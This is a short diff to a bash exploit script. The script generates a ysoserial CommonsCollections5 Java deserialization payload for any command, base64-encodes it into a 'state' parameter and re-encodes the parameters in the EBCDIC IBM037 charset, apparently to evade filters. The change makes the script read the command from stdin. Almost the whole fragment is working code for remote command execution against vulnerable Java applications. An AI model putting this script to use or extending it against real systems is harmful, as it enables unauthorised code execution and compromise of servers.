@@ -48,11 +48,13 @@ function param_processor {
     echo "${data:1}"
 }
 
+read -r cmd
+
 charset=ibm037
 processors=(urldecode "enc '${charset^^}'" urlencode)
 params='param1=v%61l%201&state=%PAYLOAD%'
 
-payload=$(java -jar ysoserial.jar CommonsCollections5 "$1"|base64 -w0)
+payload=$(java -jar ysoserial.jar CommonsCollections5 "$cmd"|base64 -w0)
 params=${params/"%PAYLOAD%"/"${payload}"}
 params_processed=$(printf "%s" "${params}"|param_processor processors)
 
